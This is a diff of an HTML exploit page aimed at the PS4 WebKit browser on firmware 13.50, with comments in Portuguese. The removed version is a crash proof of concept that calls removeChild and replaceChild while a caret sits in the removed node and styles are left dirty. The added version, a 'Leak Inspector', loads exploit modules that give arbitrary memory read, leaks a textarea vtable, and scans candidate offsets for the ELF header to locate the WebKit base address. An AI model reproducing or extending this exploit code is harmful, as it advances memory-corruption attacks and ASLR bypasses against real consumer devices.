@@ -1,311 +1,184 @@
 <!DOCTYPE html>
-<!--
-  PoC: FrameSelection::nodeWillBeRemoved → Document::updateStyleIfNeeded()
-       sob ScriptDisallowedScope::InMainThread
-
-  Baseado no padrão de crash do commit WebKit 628c558 (bug 235184 / rdar://74845918),
-  adaptado para o path de seleção comum (sem drag-and-drop) do PS4.
-
-  Alvo: PS4 FW 13.50 | libSceNKWebKit.sprx | AppleWebKit/605.1.15
-
-  Cadeia testada:
-    JS removeChild()
-    → ContainerNode::removeChild()
-        { ScriptDisallowedScope::InMainThread scriptDisallowedScope; }
-        → Document::nodeWillBeRemoved()
-            → FrameSelection::nodeWillBeRemoved()
-                → node.document().updateStyleIfNeeded()   ← VIOLATION
-                    → RELEASE ASSERTION / CRASH
-
-  Condição necessária para o crash:
-    (1) document.styleScope().hasPendingUpdate() == true  (estilo sujo)
-    (2) Documento tem elemento com -webkit-user-modify     (habilita isEditableNode path)
-    (3) Nó removido contém o caret ativo da FrameSelection
--->
-<html>
+<html lang="pt-BR">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>FrameSelection nodeWillBeRemoved PoC</title>
+<title>PS4 WebKit — Leak Inspector</title>
 <style>
-/*
-  CONDIÇÃO (2): -webkit-user-modify no body.
-  Sem essa propriedade, isEditableNode() usa o caminho rápido sem updateStyleIfNeeded().
-  Mesmo mecanismo do test case original do commit 628c558.
-*/
-body {
-    font-family: system-ui;
-    -webkit-user-modify: read-write;
-    margin: 0;
-    padding: 16px;
-    background: #0d0d0d;
-    color: #e0e0e0;
-}
-h2 {
-    font-size: 14px;
-    color: #888;
-    font-weight: normal;
-    margin: 0 0 12px;
-}
-#target {
-    width: 320px;
-    height: 80px;
-    border: 2px solid tomato;
-    padding: 12px;
-    margin-bottom: 16px;
-    font-size: 22px;
-    line-height: 56px;
-    color: #fff;
-}
-#log {
-    font-family: monospace;
-    font-size: 11px;
-    white-space: pre;
-    background: #111;
-    color: #39ff14;
-    padding: 12px;
-    border: 1px solid #333;
-    min-height: 160px;
-    overflow-y: auto;
-}
-.ok   { color: #39ff14; }
-.fail { color: #ff4444; }
-.info { color: #888; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; background: #0b0f19; color: #c8ced8;
+    font: 13px/1.5 "Segoe UI", system-ui, sans-serif;
+    display: flex; flex-direction: column; align-items: center;
+    gap: 12px; padding: 16px; }
+  h1 { color: #fff; font-size: 16px; }
+  #leaks { background: #111827; border: 1px solid #1f2937; border-radius: 8px;
+    padding: 14px; width: 95%; max-width: 700px; font-family: monospace; font-size: 13px; }
+  .leak-row { display: flex; justify-content: space-between; padding: 4px 0;
+    border-bottom: 1px solid #1f2937; }
+  .leak-row:last-child { border-bottom: none; }
+  .label { color: #9ca3af; } .value { color: #60a5fa; font-weight: bold; }
+  #log { width: 95%; max-width: 700px; height: 180px; background: #111827;
+    border: 1px solid #1f2937; border-radius: 8px; padding: 10px;
+    overflow-y: auto; font-family: monospace; font-size: 11px; color: #9fb1c3; }
+  #log .ok { color: #4ade80; } #log .err { color: #f87171; }
+  #log .found { color: #a78bfa; font-weight: bold; }
+  #controls { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; }
+  .ctrl-btn { padding: 10px 18px; border-radius: 6px; border: none;
+    background: #1e40af; color: #fff; cursor: pointer; font-size: 13px; font-weight: 600; }
+  .ctrl-btn:hover { background: #2563eb; }
+  .ctrl-btn:disabled { background: #374151; opacity: 0.5; cursor: not-allowed; }
+  .ctrl-btn.success { background: #15803d; }
+  .ctrl-btn.success:hover { background: #16a34a; }
+  input { background: #111827; border: 1px solid #374151; color: #fff;
+    padding: 8px 12px; border-radius: 5px; font-family: monospace; font-size: 13px; width: 180px; }
+  input:focus { outline: none; border-color: #60a5fa; }
+  .section { color: #9ca3af; font-size: 11px; text-transform: uppercase; margin-top: 4px; }
 </style>
 </head>
 <body>
-<h2>FrameSelection::nodeWillBeRemoved PoC — PS4 FW 13.50</h2>
+<h1>PS4 WebKit — Leak Inspector (1 teste por vez)</h1>
 
-<!-- Nó alvo: contém o caret e o <br> que será removido -->
-<div id="target">Caret aqui<br id="anchor"></div>
+<div class="section">Valores Vazados</div>
+<div id="leaks">
+  <div class="leak-row"><span class="label">__ps5NativeCtor:</span><span class="value" id="l-ctor">---</span></div>
+  <div class="leak-row"><span class="label">textarea obj:</span><span class="value" id="l-obj">---</span></div>
+  <div class="leak-row"><span class="label">textarea vtable ptr:</span><span class="value" id="l-vtptr">---</span></div>
+  <div class="leak-row"><span class="label">textarea vtable[0]:</span><span class="value" id="l-vt0">---</span></div>
+  <div class="leak-row"><span class="label">ctor offset (base=0):</span><span class="value" id="l-off">---</span></div>
+</div>
+
+<div class="section">Testar 1 Offset</div>
+<div id="controls">
+  <input type="text" id="offInput" placeholder="Offset hex, ex: 0x2511400" value="0x2511400">
+  <button class="ctrl-btn" id="btnTest" onclick="testOffset()">Testar Offset</button>
+  <button class="ctrl-btn success" id="btnVtable" onclick="readVtable()">Ler VTable</button>
+  <button class="ctrl-btn" onclick="gc()">Forçar GC</button>
+</div>
 
 <div id="log"></div>
 
-<script>
-"use strict";
+<script type="module">
+  import { establishPrimitive } from "./resources/core.js";
+  import { installWindowP } from "./resources/mem.js";
+  import { int64 } from "./resources/int64.js";
 
-/* ── Logging com persistência (para detectar crash-reload) ── */
-var LOG_KEY = 'poc_frameselhit';
-var logEl   = document.getElementById('log');
+  const logBox = document.getElementById("log");
+  function log(msg, cls) {
+    const line = document.createElement("div");
+    line.className = cls || "info";
+    line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight;
+    if (logBox.children.length > 50) logBox.removeChild(logBox.firstChild);
+  }
 
-function appendLog(msg, cls) {
-    var line = document.createElement('span');
-    line.className = cls || '';
-    line.textContent = msg + '\n';
-    logEl.appendChild(line);
-    // Persiste antes de um possível crash nativo
-    try { localStorage.setItem(LOG_KEY, logEl.textContent); } catch(e) {}
-}
+  window.gc = function() {
+    if (typeof globalThis.gc === "function") {
+      try { globalThis.gc(); log("GC forçado.", "ok"); } catch(e) { log("GC falhou: " + e.message, "err"); }
+    } else {
+      // Tentar trigger GC via pressão de memória
+      try {
+        let trash = [];
+        for (let i = 0; i < 100; i++) trash.push(new ArrayBuffer(0x100000));
+        trash = null;
+        log("GC triggered via pressure.", "ok");
+      } catch(e) { log("GC pressure falhou.", "err"); }
+    }
+  };
 
-function log(msg)  { appendLog(msg); }
-function ok(msg)   { appendLog('[OK]   ' + msg, 'ok'); }
-function fail(msg) { appendLog('[FAIL] ' + msg, 'fail'); }
-function info(msg) { appendLog('[--]   ' + msg, 'info'); }
+  let vtable0 = null;
+  let ctorAddr = null;
 
-/* ── Detecta reload pós-crash ── */
-(function detectCrashReload() {
+  window.readVtable = function() {
+    const p = window.p;
+    if (!p) { log("window.p não disponível!", "err"); return; }
     try {
-        var prev = localStorage.getItem(LOG_KEY);
-        if (prev) {
-            appendLog('[RELOAD DETECTADO — log pré-crash:]', 'fail');
-            appendLog(prev, 'info');
-            appendLog('─────────────────────────────────────────', 'info');
-            localStorage.removeItem(LOG_KEY);
+      let textArea = document.createElement("textarea");
+      let objAddr = p.leakval(textArea);
+      let vtPtr = p.read8(objAddr.add32(0x18));
+      let vt0 = p.read8(vtPtr);
+      vtable0 = vt0;
+
+      document.getElementById("l-obj").textContent = "0x" + objAddr.toString(16);
+      document.getElementById("l-vtptr").textContent = "0x" + vtPtr.toString(16);
+      document.getElementById("l-vt0").textContent = "0x" + vt0.toString(16);
+
+      log("textarea obj = 0x" + objAddr.toString(16), "ok");
+      log("vtable ptr   = 0x" + vtPtr.toString(16), "ok");
+      log("vtable[0]    = 0x" + vt0.toString(16), "ok");
+
+      // Calcular offset do ctor se disponível
+      if (ctorAddr) {
+        let off = ctorAddr - (vt0.hi * 0x100000000 + vt0.low);
+        // Na verdade, precisamos da base, não do vtable
+        // Mas podemos estimar: se base ~ vtable[0] - X, e ctor = base + Y
+        // então vtable[0] - ctor = X - Y
+        let diff = (vt0.hi * 0x100000000 + vt0.low) - ctorAddr;
+        log("vtable[0] - ctor = 0x" + diff.toString(16) + " (" + (diff/0x100000).toFixed(1) + "MB)", "info");
+      }
+
+      window.gc();
+    } catch (e) { log("Erro: " + e.name + ": " + e.message, "err"); }
+  };
+
+  window.testOffset = function() {
+    const p = window.p;
+    if (!p || !vtable0) { log("Leia o vtable primeiro (botao verde)!", "err"); return; }
+
+    const input = document.getElementById("offInput").value.trim();
+    let off = parseInt(input, 16);
+    if (isNaN(off) || off <= 0) { log("Offset invalido", "err"); return; }
+
+    let base = vtable0.sub32(off);
+    let baseNum = base.hi * 0x100000000 + base.low;
+    log("=== Testando offset 0x" + off.toString(16) + " ===", "warn");
+    log("Base calculada = 0x" + base.toString(16), "info");
+
+    try {
+      let magic = p.read4(base);
+      let magicHex = "0x" + magic.toString(16).padStart(8, "0");
+      log("Magic: " + magicHex, magicHex === "0x464c457f" ? "found" : "info");
+
+      if (magicHex === "0x464c457f") {
+        log("✅ BASE ENCONTRADA!", "found");
+        window.__webkitBase = base;
+        // Se temos ctor, calcular offset do ctor
+        if (ctorAddr) {
+          let ctorOff = ctorAddr - baseNum;
+          log("__ps5NativeCtor offset = 0x" + ctorOff.toString(16), "ok");
         }
-    } catch(e) {}
-})();
+        return;
+      }
 
-/* ── Utilitário: coloca caret em um nó ── */
-function setCaretInNode(node) {
-    var sel   = window.getSelection();
-    var range = document.createRange();
-    range.setStart(node, 0);
-    range.collapse(true);
-    sel.removeAllRanges();
-    sel.addRange(range);
-    return sel;
-}
+      // Se não é ELF, tentar ler alguns bytes para ver se é código válido
+      let b1 = p.read1(base.add32(0));
+      let b2 = p.read1(base.add32(1));
+      let b3 = p.read1(base.add32(2));
+      let b4 = p.read1(base.add32(3));
+      log("Bytes @ base: " + b1.toString(16) + " " + b2.toString(16) + " " + b3.toString(16) + " " + b4.toString(16), "info");
 
-/* ── Utilitário: suja o estilo sem resolver (hasPendingUpdate=true) ── */
-function dirtyStyle() {
-    // Modificação de atributo → invalidação de estilo sem layout síncrono
-    document.body.setAttribute('data-dirty', String(Date.now()));
-    // Inline style no target também garante dirty no sub-tree
-    document.getElementById('target').style.color = '#fff';
-    // Neste ponto: styleScope().hasPendingUpdate() == true
-    // NÃO chamamos offsetHeight/offsetTop aqui — isso resolveria o pending.
-}
+    } catch (e) { log("FALHA: " + e.name + ": " + e.message, "err"); }
 
-/* ══════════════════════════════════════════════════════════════════════
-   TESTE A
-   Remover o <br id="anchor"> com caret nele.
-   Replica a lógica do remove-node-on-drop.html do commit 628c558,
-   mas via JS puro (sem drag).
-   ══════════════════════════════════════════════════════════════════════ */
-function testeA() {
-    log('');
-    log('═══ TESTE A: removeChild(<br>) com caret no anchor ═══');
+    window.gc();
+  };
 
-    var anchor = document.getElementById('anchor');
-    var target = document.getElementById('target');
+  log("Carregando modulos...", "ok");
+  establishPrimitive({ onEvent: (tag, detail) => log(tag + ": " + detail, "info") })
+    .then(carrier => {
+      const prim = installWindowP(carrier, { onEvent: (tag, detail) => log(tag + ": " + detail, "info"), promote: true });
+      window.__carrier = carrier; window.__prim = prim; window.p = prim; window.int64 = int64;
+      log("Exploit pronto!", "ok");
 
-    if (!anchor) { fail('anchor não encontrado'); return false; }
-    if (!target) { fail('target não encontrado'); return false; }
+      let ctor = globalThis.__ps5NativeCtor;
+      if (typeof ctor === "number") {
+        ctorAddr = ctor;
+        document.getElementById("l-ctor").textContent = "0x" + ctor.toString(16);
+        log("__ps5NativeCtor = 0x" + ctor.toString(16), "ok");
+      }
 
-    // Fase 1: Caret no <br>
-    var sel = setCaretInNode(anchor);
-    if (!sel.anchorNode) { fail('getSelection().anchorNode == null'); return false; }
-    ok('Caret em: ' + sel.anchorNode.nodeName + ' offset=' + sel.anchorOffset);
-
-    // Fase 2: Dirty estilo
-    dirtyStyle();
-    ok('Estilo sujo (hasPendingUpdate=true esperado)');
-
-    // Fase 3: removeChild — ScriptDisallowedScope ativo internamente
-    //   Stack esperado do crash:
-    //     ContainerNode::removeChild
-    //       [ScriptDisallowedScope::InMainThread]
-    //         Document::nodeWillBeRemoved
-    //           FrameSelection::nodeWillBeRemoved
-    //             document.updateStyleIfNeeded()  ← VIOLATION → crash
-    log('Chamando removeChild(anchor)...');
-    try {
-        anchor.parentNode.removeChild(anchor);
-        // Se chegar aqui, a path não crashou
-        fail('removeChild retornou sem crash (A). Path pode estar patchada.');
-        return false;
-    } catch(e) {
-        // Exceção JS é improvável; crash nativo não gera catch
-        fail('Exceção JS (inesperado): ' + e);
-        return false;
-    }
-    // Linha inalcançável se crash nativo ocorreu
-}
-
-/* ══════════════════════════════════════════════════════════════════════
-   TESTE B
-   Remover o div#target inteiro com caret no seu firstChild.
-   Verifica se a profundidade da remoção importa.
-   ══════════════════════════════════════════════════════════════════════ */
-function testeB() {
-    log('');
-    log('═══ TESTE B: removeChild(div#target) — remoção do container ═══');
-
-    var target = document.getElementById('target');
-    if (!target) { info('target já removido em A'); return false; }
-
-    // Reinsere target se necessário (caso A não crashou)
-    if (!target.parentNode) {
-        document.body.insertBefore(target, logEl);
-        // Garante que há um TextNode para o caret
-        if (!target.firstChild) {
-            target.appendChild(document.createTextNode('Caret aqui'));
-        }
-    }
-
-    // Caret no firstChild do target
-    var anchor2 = target.firstChild;
-    if (!anchor2) { fail('target.firstChild == null'); return false; }
-
-    var sel = setCaretInNode(anchor2);
-    ok('Caret em: ' + sel.anchorNode.nodeName + ' (firstChild do target)');
-
-    // Dirty mais agressivo: className change também invalida
-    target.className = 'dirty-b';
-    dirtyStyle();
-    ok('Estilo sujo via className + inline style');
-
-    log('Chamando removeChild(target)...');
-    try {
-        target.parentNode.removeChild(target);
-        fail('removeChild retornou sem crash (B). Testando C...');
-        return false;
-    } catch(e) {
-        fail('Exceção JS (B): ' + e);
-        return false;
-    }
-}
-
-/* ══════════════════════════════════════════════════════════════════════
-   TESTE C
-   Variante com innerHTML dirty + remoção via replaceChild.
-   Alguns ports WebKit têm ScriptDisallowedScope em replaceChild também.
-   ══════════════════════════════════════════════════════════════════════ */
-function testeC() {
-    log('');
-    log('═══ TESTE C: replaceChild com caret no nó substituído ═══');
-
-    // Cria novo nó alvo
-    var nodeC = document.createElement('div');
-    nodeC.id  = 'target_c';
-    nodeC.appendChild(document.createTextNode('Caret C'));
-    document.body.insertBefore(nodeC, logEl);
-
-    var sel = setCaretInNode(nodeC.firstChild);
-    ok('Caret em TextNode de nodeC');
-
-    // Dirty: forçar via style sheet change (mais baixo nível)
-    var tmpStyle = document.createElement('style');
-    tmpStyle.textContent = '#target_c { color: red; }';
-    document.head.appendChild(tmpStyle);
-    // Remover tmpStyle marca style como dirty sem resolver
-    document.head.removeChild(tmpStyle);
-    dirtyStyle();
-    ok('Dirty via style sheet add/remove');
-
-    var replacement = document.createElement('div');
-    replacement.textContent = 'replaced';
-
-    log('Chamando replaceChild(replacement, nodeC)...');
-    try {
-        nodeC.parentNode.replaceChild(replacement, nodeC);
-        fail('replaceChild retornou sem crash (C).');
-        return false;
-    } catch(e) {
-        fail('Exceção JS (C): ' + e);
-        return false;
-    }
-}
-
-/* ══════════════════════════════════════════════════════════════════════
-   RUNNER PRINCIPAL
-   Dois rAFs para garantir que layout inicial terminou antes de
-   colocar o caret (selection precisa de layout para calcular posição).
-   ══════════════════════════════════════════════════════════════════════ */
-requestAnimationFrame(function() {
-    requestAnimationFrame(function() {
-        log('FrameSelection::nodeWillBeRemoved PoC');
-        log('Alvo: PS4 FW 13.50 | AppleWebKit/605.1.15');
-        log('Data: ' + new Date().toISOString());
-        log('');
-        info('Condições para crash:');
-        info('  [1] -webkit-user-modify: read-write no body  → OK (CSS)');
-        info('  [2] hasPendingUpdate=true antes do removeChild → forçado abaixo');
-        info('  [3] Selection caret dentro do nó removido    → setCaretInNode()');
-        log('');
-
-        var crashedA = testeA();
-        // Se crashedA == false (retornou), tenta B
-        if (crashedA === false) {
-            var crashedB = testeB();
-            if (crashedB === false) {
-                var crashedC = testeC();
-                if (crashedC === false) {
-                    log('');
-                    log('────────────────────────────────────────────');
-                    fail('Nenhum dos três testes causou crash nativo.');
-                    info('Possíveis razões:');
-                    info('  • FrameSelection::nodeWillBeRemoved não chama');
-                    info('    updateStyleIfNeeded() nesta versão do PS4 WebKit');
-                    info('  • ScriptDisallowedScope não ativo em removeChild aqui');
-                    info('  • isEditableNode() tem guarda diferente do DragCaret path');
-                    info('  • Verificar FrameSelection.cpp do branch Manx/Orbis');
-                    log('────────────────────────────────────────────');
-                }
-            }
-        }
-    });
-});
+      // Auto-read vtable
+      window.readVtable();
+    })
+    .catch(err => { log("FALHA: " + err.name + ": " + err.message, "err"); });
 </script>
 </body>
 </html>
